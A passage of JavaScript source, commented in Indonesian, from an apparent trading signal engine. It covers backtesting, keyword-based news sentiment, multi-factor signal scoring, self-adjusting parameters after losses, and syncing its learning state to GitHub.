            if (adverseTouch(pos.sl)) return { r: rAt(stopFill()), reason: 'SL ' + pos.sl.toFixed(4) + ' tersentuh' };
            if (favorReach(pos.tp1)) {
                pos.tp1Hit = true;
                pos.lockedR = 0.5 * rAt(pos.tp1);
                pos.sl = pos.entry;
                if (adverseTouch(pos.entry)) return { r: pos.lockedR, reason: 'TP1 lalu kembali ke breakeven di bar yang sama' };
            }
            return null;
        }
        if (adverseTouch(pos.sl)) return { r: pos.lockedR + 0.5 * rAt(stopFill()), reason: 'Trail/BE exit di ' + pos.sl.toFixed(4) };
        if (favorReach(pos.tp3)) return { r: pos.lockedR + 0.5 * rAt(pos.tp3), reason: 'TP3 runner tercapai' };
        if (pos.atr > 0) {
            const trail = L ? bar.h - 2 * pos.atr : bar.l + 2 * pos.atr;
            pos.sl = L ? Math.max(pos.sl, trail) : Math.min(pos.sl, trail);
        }
        return null;
    }

    /* Backtest out-of-sample: 40% data terakhir, memakai parameter yang SAMA dengan live
       (atrMult & tp1Ratio hasil belajar). Tidak ada optimasi parameter tersembunyi pada data uji. */
    function backtestStrategy(stratId, k, ind, opts) {
        opts = opts || {};
        const feeBps = opts.feeBps != null ? opts.feeBps : 10;
        const atrMult = opts.atrMult || 1.8;
        const oosStart = Math.max(220, Math.floor(k.length * 0.6));
        const oos = runLeg(stratId, k, ind, oosStart, k.length, atrMult, feeBps, opts);
        oos.atrMult = atrMult;
        oos.window = 'OOS_40';
        return oos;
    }
    function runLeg(stratId, k, ind, from, to, atrMult, feeBps, opts) {
        opts = opts || {};
        const slipBps = opts.slipBps != null ? opts.slipBps : QB_SLIP_BPS_DEFAULT;
        const tp1Ratio = opts.tp1Ratio || 0.8;
        let wins = 0, losses = 0, grossW = 0, grossL = 0, peak = 0, eq = 0, maxDD = 0, sumR2 = 0;
        const trades = [];
        let pos = null;
        QB_STATE.ema4h = aggEma(ind, 20, 4);
        for (let i = Math.max(from, 220); i < to; i++) {
            if (pos) {
                const res = qbStepPosition(pos, k[i]);
                if (res) {
                    const r = res.r - qbCostR(pos.entry, pos.risk, feeBps, slipBps);
                    eq += r; peak = Math.max(peak, eq); maxDD = Math.max(maxDD, peak - eq);
                    if (r > 0.01) { wins++; grossW += r; } else if (r < -0.01) { losses++; grossL += Math.abs(r); }
                    trades.push(r); sumR2 += r * r;
                    pos = null;
                }
                if (pos) continue;
            }
            const sig = QB_EVAL[stratId] && QB_EVAL[stratId](ind, i);
            if (!sig) continue;
            const atr = ind.atr[i]; if (!atr || atr <= 0) continue;
            const burst = computeMomentumBurst(ind, i);
            const tp3R = (burst.active && burst.dir === sig.side) ? QB_TP3_R_BURST : QB_TP3_R;
            pos = qbOpenPosition(sig.side, k[i].c, atr, atrMult, tp1Ratio, tp3R);
        }
        const n = trades.length;
        const netR = trades.reduce((a, b) => a + b, 0);
        const mean = n ? netR / n : 0;
        const sd = n > 1 ? Math.sqrt(Math.max(0, (sumR2 - n * mean * mean) / (n - 1))) : 0;
        return {
            trades: n, wins, losses, winRate: n ? (wins / n) * 100 : 0,
            pf: grossL > 0 ? grossW / grossL : (grossW > 0 ? 99 : 0),
            exp: mean, netR, maxDD, sumR2, grossW, grossL, sd,
            tStat: sd > 0 ? (mean / sd) * Math.sqrt(n) : 0
        };
    }

    /* ═══════════════ 6. NEWS INTELLIGENCE (SOROS CROSS-VERIFICATION) ═══════════════ */
    const BULL_KW = ['approval', 'approved', 'etf', 'partnership', 'adoption', 'accumulate', 'bullish', 'inflow', 'record high', 'upgrade', 'launch', 'breakout', 'rally', 'expansion', 'integration', 'treasury', 'milestone', 'investment', 'backing', 'recovery'];
    const BEAR_KW = ['hack', 'hacked', 'exploit', 'exploited', 'lawsuit', 'sue', 'sued', 'sec', 'ban', 'banned', 'investigation', 'probe', 'outflow', 'dump', 'crash', 'plunge', 'delist', 'delisting', 'insolvency', 'fraud', 'scam', 'breach', 'vulnerability'];
    const RUMOR_KW = ['reportedly', 'rumored', 'rumour', 'allegedly', 'unconfirmed'];
    const COIN_ALIAS = {
        BTC: ['bitcoin', 'btc'], ETH: ['ethereum', 'eth', 'ether'], SOL: ['solana', 'sol'], XRP: ['xrp', 'ripple'],
        DOGE: ['dogecoin', 'doge'], BNB: ['binance coin', 'bnb'], ADA: ['cardano', 'ada'], AVAX: ['avalanche', 'avax'],
        LINK: ['chainlink', 'link'], SUI: ['sui'], EUR: ['euro', 'ecb'], GBP: ['pound', 'sterling', 'boe']
    };
    async function qbNewsCycle() {
        const results = [];
        const errs = [];
        for (let i = 0; i < QB_FEEDS.length; i++) {
            try { results.push(await qbFetchFeed(QB_FEEDS[i])); }
            catch (e) { results.push(null); errs.push(QB_FEEDS[i].name); }
        }
        brain.news.lastErrors = errs;
        const items = [];
        results.forEach((r, i) => {
            if (r && r.length) items.push(...r);
            else items.push({ source: QB_FEEDS[i].name, title: '[OFFLINE] ' + QB_FEEDS[i].name + ' feed tidak terjangkau', link: '', pubDate: '', summary: 'Periksa koneksi — engine tetap jalan dengan sumber lain.', offline: true });
        });
        brain.news.items = items.slice(0, 45);
        const fg = await qbFetchFearGreed();
        if (fg) { brain.news.fearGreed = fg; qbJournal('NEWS', '[MACRO] Fear & Greed: ' + fg.value + ' (' + fg.classification + ') — makro sentiment riil.'); }
        if (items.some(x => !x.offline)) brain.news.fetchedAt = Date.now();
        brain.stats.newsIngested += items.filter(x => !x.offline).length;

        const perCoin = {}, breaker = [];
        const text = items.map(n => (n.title + ' ' + n.summary).toLowerCase());
        Object.keys(COIN_ALIAS).forEach(coin => {
            let bull = 0, bear = 0, srcs = new Set(), critical = false, critHead = '';
            items.forEach((n, idx) => {
                const t = text[idx];
                const rel = COIN_ALIAS[coin].some(a => new RegExp('\\b' + a + '\\b').test(t));
                if (!rel) return;
                srcs.add(n.source);
                const isRumor = RUMOR_KW.some(r => t.includes(r));
                const wgt = isRumor ? 0.5 : 1.0;
                BULL_KW.forEach(kw => { if (t.includes(kw)) bull += wgt; });
                BEAR_KW.forEach(kw => { if (t.includes(kw)) bear += 1.5 * wgt; });
                if (!isRumor && ['hack', 'exploit', 'sec', 'lawsuit', 'investigation', 'delist'].some(c => (n.title || '').toLowerCase().includes(c)) && !critical) { critical = true; critHead = n.title; }
            });
            let sentiment = 'NEUTRAL', impact = 0;
            if (bear > bull && bear >= 1.5) { sentiment = 'BEARISH'; impact = -Math.min(1, (bear - bull) / 3); }
            else if (bull > bear && bull >= 1.5) { sentiment = 'BULLISH'; impact = Math.min(1, (bull - bear) / 3); }
            perCoin[coin] = { sentiment, impact: Math.round(impact * 100) / 100, sources: [...srcs], multiSourced: srcs.size >= 2, critical, critHead };
            if (critical) breaker.push({ coin, head: critHead });
        });
        brain.news.perCoin = perCoin;
        const prevBreaker = brain.news.breaker || [];
        brain.news.breaker = breaker;
        if (breaker.length && JSON.stringify(breaker) !== JSON.stringify(prevBreaker)) {
            qbJournal('CB', '[CIRCUIT BREAKER] AKTIF: ' + breaker.map(b => b.coin).join(', ') + ' — Long baru diblokir (' + breaker[0].head.slice(0, 80) + ')');
        }
        saveBrain();
        try { qbRenderNews(); qbRenderStats(); } catch (e) { }
    }
    function newsForSymbol(sym) {
        const coin = sym.replace('USDT', '').replace('1000', '');
        return brain.news.perCoin[coin] || { sentiment: 'NEUTRAL', impact: 0, multiSourced: false, critical: false };
    }

    /* ═══════════════ 7. MASTER SCANNER & SIGNAL GENERATOR (7-SCREEN + KALMAN + HURST) ═══════════════ */
    function leverageFor(volPct) { return volPct < 1 ? 10 : (volPct < 2.5 ? 5 : 3); }

    function getBayesianPosteriorProb(stratId, regime) {
        if (!brain.bayesian || !brain.bayesian[stratId]) return 0.50;
        const cell = brain.bayesian[stratId][regime] || { alpha: 2, beta: 2 };
        return cell.alpha / (cell.alpha + cell.beta);
    }

    function updateBayesianPosterior(stratId, regime, isWin) {
        if (!brain.bayesian) brain.bayesian = defaultBayesianMatrix();
        if (!brain.bayesian[stratId]) brain.bayesian[stratId] = { TREND_UP: { alpha: 2, beta: 2 }, TREND_DOWN: { alpha: 2, beta: 2 }, RANGING: { alpha: 2, beta: 2 } };
        const rKey = (regime === 'TREND_UP' || regime === 'TREND_DOWN') ? regime : 'RANGING';
        const cell = brain.bayesian[stratId][rKey];
        if (isWin) cell.alpha = Math.min(200, cell.alpha + 1);
        else cell.beta = Math.min(200, cell.beta + 1);
    }

    function masterScore(sym, ind, votes, regime, deriv) {
        const i = ind.c.length - 2;
        const px = ind.c[i], rsi = ind.rsi[i] != null ? ind.rsi[i] : 50, atr = ind.atr[i] || px * 0.01;
        const side = votes.dir; if (!side) return null;
        let score = 0; const factors = [];
        const e4h = QB_STATE.ema4h;
        if (e4h && e4h[i] != null) {
            if ((side === 'LONG' && px > e4h[i]) || (side === 'SHORT' && px < e4h[i])) { score += 30; factors.push('[OK] Screen1 (Elder): Tren 4H selaras arah ' + side); }
            else { score -= 25; factors.push('[NO] Screen1 (Elder): Melawan tren 4H — penalti berat'); }
        }
        if (side === 'LONG' && rsi >= 40 && rsi <= brain.learned.rsiLongMax) { score += 25; factors.push('[OK] Screen2: RSI ' + rsi.toFixed(0) + ' zona momentum sehat'); }
        else if (side === 'SHORT' && rsi <= 60 && rsi >= brain.learned.rsiShortMin) { score += 25; factors.push('[OK] Screen2: RSI ' + rsi.toFixed(0) + ' zona momentum sehat'); }
        else factors.push('[NO] Screen2: RSI ' + rsi.toFixed(0) + ' di luar zona sehat');
        if (atr > 0) { score += 20; factors.push('[OK] Screen3 (Williams): SL ' + brain.learned.atrMult.toFixed(2) + 'x ATR kebal wick-hunt'); }
        if (ind.bb.up[i] != null) {
            const nearBB = side === 'LONG' ? px <= ind.bb.mid[i] * 1.005 : px >= ind.bb.mid[i] * 0.995;
            if (nearBB) { score += 15; factors.push('[OK] Screen4: Entry di area of value (dekat mid-BB)'); }
        }
        if (deriv && deriv.funding != null) {
            const fr = deriv.funding * 100;
            if (side === 'SHORT' && fr >= 0.015) { score += 10; factors.push('[OK] Screen5: Funding +' + fr.toFixed(3) + '% -> long squeeze risk'); }
            else if (side === 'LONG' && fr <= -0.01) { score += 10; factors.push('[OK] Screen5: Funding ' + fr.toFixed(3) + '% -> short squeeze fuel'); }
            if (deriv.oiChg != null) {
                if (side === 'LONG' && deriv.oiChg > 2) { score += 5; factors.push('[OK] OI naik +' + deriv.oiChg.toFixed(1) + '% 24h -> akumulasi modal nyata'); }
                if (side === 'SHORT' && deriv.oiChg > 2 && deriv.priceChg24h > 8) { score += 5; factors.push('[OK] OI naik saat rally -> fresh short institusi'); }
            }
        }
        const whaleCoin = sym.replace('USDT', '').replace('1000', '');
        const wb = (brain.whale && brain.whale.bias) ? (brain.whale.bias[whaleCoin] || 0) : 0;
        if (wb) {
            if (side === 'LONG' && wb >= 10) { score += 8; factors.push('[OK] Screen5b (Whales): smart money net LONG +' + wb.toFixed(1)); }
            else if (side === 'SHORT' && wb <= -10) { score += 8; factors.push('[OK] Screen5b (Whales): smart money net SHORT ' + wb.toFixed(1)); }
            else if ((side === 'LONG' && wb <= -10) || (side === 'SHORT' && wb >= 10)) { score -= 6; factors.push('[NO] Screen5b (Whales): smart money melawan arah'); }
        }
        // Screen 7 — Kalman Filter Velocity & Hurst Exponent Fractal Efficiency
        if (ind.kalman && ind.kalman.vel[i] != null) {
            const kv = ind.kalman.vel[i];
            const H = ind.hurst || 0.50;
            brain.lastHurst = H;
            if ((side === 'LONG' && kv >= 0) || (side === 'SHORT' && kv <= 0)) {
                score += 6;
                factors.push('[OK] Screen7 (Kalman+Hurst): Fair-Value velocity searah (H=' + H.toFixed(2) + ')');
            }
        }
        const nw = newsForSymbol(sym);
        if (nw.critical && side === 'LONG') { score -= 40; factors.push('[BREAKER] Screen6: CIRCUIT BREAKER — berita krisis'); }
        else if (nw.critical && side === 'SHORT') { score += 10; factors.push('[OK] Screen6: krisis terverifikasi memperkuat Short'); }
        else if (nw.impact > 0.3 && side === 'LONG') { score += 10; factors.push('[OK] Screen6: sentimen BULLISH multi-sumber'); }
        else if (nw.impact < -0.3 && side === 'SHORT') { score += 10; factors.push('[OK] Screen6: sentimen BEARISH multi-sumber'); }
        else factors.push('[INFO] Screen6: berita netral');

        const vpinInfo = computeVpinAndObi(ind, i);
        if (!vpinInfo.toxic && ((side === "LONG" && vpinInfo.obi > 0.05) || (side === "SHORT" && vpinInfo.obi < -0.05))) {
            score += 5;
            factors.push("[OK] Screen9 (VPIN+OBI): Order-Flow Institutional Imbalance " + (vpinInfo.obi >= 0 ? "+" : "") + (vpinInfo.obi * 100).toFixed(1) + "% · VPIN " + vpinInfo.vpin + " (" + vpinInfo.slicingMode + ")");
        } else if (vpinInfo.toxic) {
            score -= 8;
            factors.push("[WARN] Screen9 (VPIN Toxicity): VPIN " + vpinInfo.vpin + " tinggi -> Ukuran entry dipangkas & mode TWAP diaktifkan");
        }
        const momBurst = computeMomentumBurst(ind, i);
        let tp3Mult = QB_TP3_R;
        if (momBurst.active && momBurst.dir === side) {
            score += 8;
            tp3Mult = QB_TP3_R_BURST;
            factors.push('[OK] Screen8 (Momentum Burst): Impuls institusional Vol ' + momBurst.volRatio + 'x · Body ' + Math.round(momBurst.bodyRatio * 100) + '% -> Target TP3 diperluas ke 3.2R (SL tetap ketat 1.0R)');
        }

        const volPct = (atr / px) * 100;
        const mult = brain.learned.atrMult;
        const tp1R = brain.learned.tp1Ratio || 0.8;
        // Level dibangun oleh mesin yang sama dengan backtest (qbOpenPosition) agar live == backtest.
        const pos = qbOpenPosition(side, px, atr, mult, tp1R, tp3Mult);
        return {
            id: 'sig_' + sym + '_' + Date.now(),
            sym, side, entry: px, sl: pos.sl, slInit: pos.slInit, risk: pos.risk, rsiAtEntry: rsi != null ? Math.round(rsi) : null,
            tp1: pos.tp1,
            tp2: pos.tp2,
            tp3: pos.tp3,
            momentumBurst: momBurst.active && momBurst.dir === side,
            lev: leverageFor(volPct), conf: Math.max(0, Math.min(100, Math.round(score))),
            regime, hurst: ind.hurst || 0.5, kalmanPrice: (ind.kalman && ind.kalman.est && ind.kalman.est[i]) || px, kalmanVelZ: (ind.kalman && ind.kalman.vel && ind.kalman.vel[i] != null && atr) ? +(ind.kalman.vel[i] / atr).toFixed(4) : 0, bayesProb: (votes.list && votes.list[0] && votes.list[0].bayesP) || 0.55, factors, votes: votes.list, atr, volPct
        };
    }

    async function qbScanSymbols(list) {
        for (const sym of list) {
            const asset = QB_BY_SYM[sym]; if (!asset) continue;
            if (brain.signals.some(s => s.sym === sym && (s.status === 'OPEN' || s.status === 'TP1_SECURED'))) continue;
            try {
                const k = await qbFetchCandles(asset);
                const ind = buildIndicators(k);
                QB_STATE.ema4h = aggEma(ind, 20, 4);
                const i = ind.c.length - 2;
                const regime = detectRegime(ind, i);
                const H = ind.hurst || 0.50;
                brain.lastHurst = H;

                let longW = 0, shortW = 0; const votes = [];
                QB_STRATS.forEach(st => {
                    if (!st.fit.includes(regime)) return;
                    const baseW = brain.weights[st.id] || 1;
                    if (baseW < 0.45) return;
                    // Adjust weight by Bayesian posterior & Hurst Fractal regime compatibility
                    const bayesP = getBayesianPosteriorProb(st.id, regime);
                    const hurstMult = (H > 0.55 && ['elder', 'donchian', 'macdm', 'tsmom'].includes(st.id)) ? 1.15
                        : (H < 0.45 && ['rsidiv', 'wyckoff', 'bbrev', 'statarb', 'smc'].includes(st.id)) ? 1.15 : 1.0;
                    const w = baseW * (0.7 + 0.6 * bayesP) * hurstMult;

                    for (let b = i - 2; b <= i; b++) {
                        const sig = QB_EVAL[st.id](ind, b);
                        if (sig) {
                            const decay = 1 - (i - b) * 0.15;
                            if (sig.side === 'LONG') longW += w * decay; else shortW += w * decay;
                            votes.push({ strat: st.id, side: sig.side, note: sig.note, w: Math.round(w * decay * 100) / 100, barAge: i - b });
                            break;
                        }
                    }
                });
                if (votes.length < 2) continue;
                const dir = longW > shortW * 1.4 ? 'LONG' : (shortW > longW * 1.4 ? 'SHORT' : null);
                if (!dir) continue;

                let deriv = null;
                if (asset.src === 'binance') {
                    const f = await qbFetchFunding(sym); const oi = await qbFetchOIHist(sym);
                    if (f || oi) deriv = { funding: f ? f.rate : null, oiChg: oi ? oi.chgPct : null, priceChg24h: ((ind.c[i] - ind.c[i - 24]) / ind.c[i - 24]) * 100 };
                }
                const ms = masterScore(sym, ind, { dir, list: votes }, regime, deriv);
                if (!ms || ms.conf < brain.params.minScore) continue;
                const nw = newsForSymbol(sym);
                if (nw.critical && ms.side === 'LONG') {
                    qbJournal('CB', '[BREAKER] Long ' + sym + ' DIBATALKAN circuit breaker: ' + (nw.critHead || '').slice(0, 70));
                    continue;
                }
                ms.status = 'OPEN'; ms.createdAt = Date.now(); ms.tp1Hit = false; ms.beActive = false; ms.lockedR = 0; ms.mfe = 0; ms.mae = 0; ms.rsiAtEntry = ind.rsi[i] != null ? Math.round(ind.rsi[i]) : null;
                brain.signals.unshift(ms);
                if (brain.signals.length > QB_MAX_SIGNALS) brain.signals.length = QB_MAX_SIGNALS;
                qbJournal('SIGNAL', '[SIGNAL] ' + ms.side + ' ' + sym + ' @ ' + ms.entry.toFixed(4) + ' | Skor ' + ms.conf + '/100 | rezim ' + regime + ' (H=' + H.toFixed(2) + ') | ' + votes.length + ' strategi: ' + votes.map(v => v.strat).join('+'));
                if (brain.autoExecBursa && !adminConfig.globalKillSwitch) {
                    try { autoExecuteSignalAcrossConnectedExchanges(ms); } catch (e) { }
                }
            } catch (e) { }
        }
        saveBrain();
    }

    /* ═══════════════ 8. LIVE EVALUATION + SELF-LEARNING POST-MORTEM ═══════════════
       Setiap sinyal dievaluasi bar-per-bar (high/low, bukan hanya harga close) sejak bar terakhir yang
       sudah diperiksa, memakai qbStepPosition yang sama dengan backtest. */
    function qbNormalizeSignalPosition(s) {
        if (!(s.risk > 0)) {
            const fromInit = s.slInit != null ? Math.abs(s.entry - s.slInit) : 0;
            const fromSl = (!s.tp1Hit && s.sl != null) ? Math.abs(s.entry - s.sl) : 0;
            const fromTp2 = s.tp2 != null ? Math.abs(s.tp2 - s.entry) / QB_TP2_R : 0;
            s.risk = fromInit || fromSl || fromTp2;
        }
        if (s.slInit == null && s.risk > 0) s.slInit = s.side === 'LONG' ? s.entry - s.risk : s.entry + s.risk;
        if (!(s.atr > 0) && s.risk > 0) s.atr = s.risk / (brain.learned.atrMult || 1.8);
        if (s.lockedR == null) s.lockedR = 0;
        if (s.lastBarT == null) s.lastBarT = s.createdAt || Date.now();
    }

    async function qbEvaluateOpenSignals() {
        const open = brain.signals.filter(s => s.status === 'OPEN' || s.status === 'TP1_SECURED');
        for (const s of open) {
            try {
                const asset = QB_BY_SYM[s.sym]; if (!asset) continue;
                qbNormalizeSignalPosition(s);
                if (!(s.risk > 0)) continue;
                const isYahoo = asset.src === 'yahoo';
                const barMs = isYahoo ? 3600e3 : 300e3;
                const k = isYahoo ? await qbFetchYahoo(s.sym) : await qbFetchBinanceKlines(s.sym, '5m', 1500, s.lastBarT);
                const now = Date.now();
                // Hanya bar yang SUDAH selesai dan belum pernah diperiksa (tidak ada bar yang dihitung dua kali).
                const bars = k.filter(b => b.t >= s.lastBarT && b.t + barMs <= now);
                const L = s.side === 'LONG';
                let res = null;
                for (const bar of bars) {
                    const favPx = L ? bar.h : bar.l, advPx = L ? bar.l : bar.h;
                    s.mfe = Math.max(s.mfe || 0, (L ? favPx - s.entry : s.entry - favPx) / s.risk);
                    s.mae = Math.min(s.mae || 0, (L ? advPx - s.entry : s.entry - advPx) / s.risk);
                    const wasTp1 = !!s.tp1Hit;
                    res = qbStepPosition(s, bar);
                    s.lastBarT = bar.t + barMs;
                    if (!wasTp1 && s.tp1Hit) {
                        s.beActive = true; s.status = 'TP1_SECURED'; brain.stats.tp1Hits++;
                        qbJournal('TP1', '[TP1 LOCKED] TP1 ' + s.sym + ' tercapai -> 50% ditutup, SL digeser ke breakeven');
                    }
                    if (res) break;
                }
                if (res) {
                    const netR = res.r - qbCostR(s.entry, s.risk, brain.params.feeBps, brain.params.slipBps);
                    const reason = res.reason;
                    s.status = netR > 0.02 ? 'WIN' : (netR < -0.02 ? 'LOSS' : 'BE');
                    s.closedAt = Date.now(); s.netR = Math.round(netR * 100) / 100; s.closeReason = reason;
                    brain.stats.closed++;
                    if (s.status === 'WIN') brain.stats.wins++; else if (s.status === 'LOSS') brain.stats.losses++; else brain.stats.be++;
                    if (brain.stats.peakEquity == null) brain.stats.peakEquity = 0;
                    brain.equityR = Math.round((brain.equityR + s.netR) * 100) / 100;
                    brain.stats.netR = brain.equityR;
                    if (brain.equityR > brain.stats.peakEquity) brain.stats.peakEquity = brain.equityR;
                    const dd = brain.stats.peakEquity - brain.equityR;
                    if (dd > (brain.stats.maxDrawdown || 0)) brain.stats.maxDrawdown = Math.round(dd * 100) / 100;
                    if (s.status === 'LOSS') { brain.stats.consecutiveLosses = (brain.stats.consecutiveLosses || 0) + 1; }
                    else if (s.status === 'WIN') { brain.stats.consecutiveLosses = 0; }
                    if (dd >= 5 || (brain.stats.consecutiveLosses || 0) >= 3) {
                        brain.stats.defensiveMode = true;
                        brain.params.riskPct = Math.max(0.25, Math.round((brain.params.riskPct || 1.0) * 0.7 * 100) / 100);
                    } else if (brain.stats.defensiveMode && brain.equityR >= brain.stats.peakEquity) {
                        brain.stats.defensiveMode = false;
                        brain.params.riskPct = 1.0;
                    }
                    reinforceWeights(s);
                    if (s.status === 'LOSS') qbPostMortem(s);
                    else {
                        qbRelaxLearnedParams();
                        qbJournal(s.status === 'WIN' ? 'WIN' : 'SYS', '[' + s.status + '] ' + s.sym + ' ' + s.side + ' ' + (s.netR >= 0 ? '+' : '') + s.netR.toFixed(2) + 'R — ' + reason + ' (MFE ' + (s.mfe || 0).toFixed(2) + 'R)');
                    }
                    brain.accuracyHistory.push({ t: Date.now(), acc: brain.stats.closed ? (brain.stats.wins + brain.stats.be) / brain.stats.closed * 100 : 0, eq: brain.equityR });
                }
            } catch (e) { }
        }
        saveBrain();
        qbScheduleSync();
    }
    function reinforceWeights(s) {
        const isWin = (s.netR || 0) > 0;
        (s.votes || []).forEach(v => {
            const cur = brain.weights[v.strat] || 1;
            brain.weights[v.strat] = Math.round(Math.max(0.3, Math.min(3, cur * (1 + 0.08 * (s.netR || 0)))) * 1000) / 1000;
            // Posterior Bayesian HANYA diperbarui dari hasil sinyal live/paper (bukan dari backtest berulang).
            updateBayesianPosterior(v.strat, s.regime || 'RANGING', isWin);
        });
    }

    /* Post-mortem berbasis bukti: satu loss TIDAK langsung mengubah parameter.
       Penyebab dicatat; parameter baru disesuaikan bila penyebab yang sama muncul >= QB_LEARN_MIN_EVIDENCE kali
       dalam QB_LEARN_WINDOW trade tertutup terakhir. Setiap win/BE menarik parameter sedikit kembali ke default
       sehingga parameter tidak terus bergeser ke satu arah. */
    const QB_LEARN_DEFAULTS = { atrMult: 1.8, rsiLongMax: 62, rsiShortMin: 38, tp1Ratio: 0.8, volConfirmMult: 1.15 };
    const QB_LEARN_MIN_EVIDENCE = 5, QB_LEARN_WINDOW = 30, QB_LEARN_RELAX = 0.05;

    function qbLearnLogPush(cause) {
        if (!Array.isArray(brain.learnLog)) brain.learnLog = [];
        brain.learnLog.push({ t: Date.now(), cause });
        if (brain.learnLog.length > QB_LEARN_WINDOW) brain.learnLog.splice(0, brain.learnLog.length - QB_LEARN_WINDOW);
        return brain.learnLog.filter(x => x.cause === cause).length;
    }

    function qbRelaxLearnedParams() {
        qbLearnLogPush('OK');
        const L = brain.learned;
        Object.keys(QB_LEARN_DEFAULTS).forEach(key => {
            const d = QB_LEARN_DEFAULTS[key], cur = L[key] != null ? L[key] : d;
            L[key] = Math.round((cur + (d - cur) * QB_LEARN_RELAX) * 1000) / 1000;
        });
    }

    function qbDiagnoseLoss(s) {
        const mfe = s.mfe || 0;
        if (mfe >= 0.5) return { cause: 'GIVEBACK', text: 'Harga sempat profit +' + mfe.toFixed(2) + 'R lalu berbalik ke SL (profit giveback).' };
        if (mfe >= 0.20) return { cause: 'WICK_HUNT', text: 'SL tersentuh setelah MFE ' + mfe.toFixed(2) + 'R — indikasi wick-hunt / noise likuiditas.' };
        if (s.side === 'LONG' && s.rsiAtEntry != null && s.rsiAtEntry > brain.learned.rsiLongMax - 6) return { cause: 'LATE_LONG', text: 'Entry Long di zona momentum jenuh (RSI ' + s.rsiAtEntry + ') — terlambat di pucuk.' };
        if (s.side === 'SHORT' && s.rsiAtEntry != null && s.rsiAtEntry < brain.learned.rsiShortMin + 6) return { cause: 'LATE_SHORT', text: 'Entry Short di zona jenuh jual (RSI ' + s.rsiAtEntry + ') — menjual di lembah.' };
        return { cause: 'REGIME_FLIP', text: 'Pembalikan rezim pasar mendadak / false breakout tanpa kelanjutan volume.' };
    }

    function qbApplyAdaptation(cause) {
        const L = brain.learned;
        if (cause === 'GIVEBACK') {
            L.tp1Ratio = Math.max(0.55, Math.round(((L.tp1Ratio || 0.8) - 0.05) * 100) / 100);
            L.atrMult = Math.min(2.4, Math.round((L.atrMult + 0.05) * 100) / 100);
            return 'TP1 diketatkan ke ' + L.tp1Ratio + 'R & ATR SL ' + L.atrMult + 'x';
        }
        if (cause === 'WICK_HUNT') {
            L.atrMult = Math.min(2.4, Math.round((L.atrMult + 0.1) * 100) / 100);
            return 'ATR buffer dinaikkan ke ' + L.atrMult.toFixed(2) + 'x';
        }
        if (cause === 'LATE_LONG') {
            L.rsiLongMax = Math.max(52, L.rsiLongMax - 2);
            return 'batas RSI Long diketatkan ke ' + L.rsiLongMax;
        }
        if (cause === 'LATE_SHORT') {
            L.rsiShortMin = Math.min(48, L.rsiShortMin + 2);
            return 'batas RSI Short diketatkan ke ' + L.rsiShortMin;
        }
        L.atrMult = Math.min(2.4, Math.round((L.atrMult + 0.08) * 100) / 100);
        L.volConfirmMult = Math.min(1.6, Math.round(((L.volConfirmMult || 1.15) + 0.05) * 100) / 100);
        return 'ATR SL ' + L.atrMult.toFixed(2) + 'x & Vol filter ' + L.volConfirmMult.toFixed(2) + 'x';
    }

    function qbPostMortem(s) {
        const diag = qbDiagnoseLoss(s);
        const count = qbLearnLogPush(diag.cause);
        let action;
        if (count >= QB_LEARN_MIN_EVIDENCE) {
            const adapted = qbApplyAdaptation(diag.cause);
            brain.learnLog = brain.learnLog.filter(x => x.cause !== diag.cause); // bukti sudah dipakai
            brain.stats.lessons++;
            action = 'ADAPTASI (' + count + ' loss dengan penyebab sama dalam ' + QB_LEARN_WINDOW + ' trade terakhir) -> ' + adapted;
        } else {
            action = 'Dicatat sebagai bukti ' + count + '/' + QB_LEARN_MIN_EVIDENCE + ' — parameter belum diubah (hindari overfit pada satu kejadian).';
        }
        s.lossCause = diag.cause;
        qbJournal('LOSS', '[LOSS] ' + s.sym + ' ' + s.side + ' LOSS ' + s.netR.toFixed(2) + 'R — ' + s.closeReason + ' | Akar: ' + diag.text + ' | ' + action);
    }
    function qbJournal(type, text) {
        brain.journal.unshift({ t: Date.now(), type, text });
        if (brain.journal.length > QB_MAX_JOURNAL) brain.journal.length = QB_MAX_JOURNAL;
    }

    /* ═══════════════ 8b. GITHUB PERSISTENCE (learning DB) ═══════════════ */
    function qbGithubToken() { try { return localStorage.getItem(QB_GITHUB_TOKEN_KEY) || ''; } catch (e) { return ''; } }
    async function qbGithubLoad() {
        try {
            const r = await fetch(QB_GITHUB_RAW + 'learning_state.json?cb=' + Date.now(), { cache: 'no-store' });
            if (!r.ok) return false;
            const remote = safeJsonParse(await r.text(), null);
            if (!remote || !remote.brain) return false;
            const rb = remote.brain;
            const localUpdated = brain.journal.length ? (brain.journal[0].t || 0) : 0;
            const remoteUpdated = remote.updatedAt || 0;
            if (remoteUpdated && remoteUpdated <= localUpdated && brain.signals.length) return false;
            // Parameter & bobot dari engine lama (tanpa engineV 2) diabaikan agar tidak mencemari engine baru.
            if (rb.engineV === 2 && rb.learned) brain.learned = Object.assign({}, brain.learned, rb.learned);
            if (rb.engineV === 2 && rb.weights) brain.weights = Object.assign({}, brain.weights, rb.weights);
            if (Array.isArray(rb.signals)) {
                const ids = new Set(brain.signals.map(s => s.id));
                rb.signals.forEach(s => { if (!ids.has(s.id)) brain.signals.push(s); });
            }
            if (Array.isArray(rb.journal)) {
                const seen = new Set(brain.journal.map(j => j.t + '|' + j.text));
                rb.journal.forEach(j => { if (!seen.has(j.t + '|' + j.text)) brain.journal.push(j); });
                brain.journal.sort((a, b) => b.t - a.t);
                if (brain.journal.length > QB_MAX_JOURNAL) brain.journal.length = QB_MAX_JOURNAL;
            }
            brain.stats.lessons = Math.max(brain.stats.lessons, (rb.stats && rb.stats.lessons) || 0);
            saveBrain();
            return true;
        } catch (e) { return false; }
    }
    async function qbGithubSha(path) {
        const r = await fetch(QB_GITHUB_API + path, { headers: qbGithubToken() ? { 'Authorization': 'token ' + qbGithubToken() } : {} });
        if (!r.ok) return null;
        const j = await r.json();
        return j.sha;
    }
    async function qbGithubPut(path, content) {
        const token = qbGithubToken();
        if (!token) return false;
        try {
            const sha = await qbGithubSha(path);
            const body = { message: 'quant-brain sync ' + new Date().toISOString(), content: btoa(unescape(encodeURIComponent(content))), branch: QB_GITHUB_BRANCH };
            if (sha) body.sha = sha;
            const r = await fetch(QB_GITHUB_API + path, {
                method: 'PUT',
                headers: { 'Authorization': 'token ' + token, 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            return r.ok;
        } catch (e) { return false; }
    }
    /* Hanya penulis terautentikasi yang boleh menulis state bersama:
       - Browser: hanya admin yang login lewat Firebase Google Auth (ID token dikirim sebagai ?auth=).
       - Daemon Node: token service account ditambahkan oleh wrapper fetch di headless-quant-daemon.js.
       Pengunjung biasa hanya membaca. Rules RTDB menolak tulis tanpa auth. */
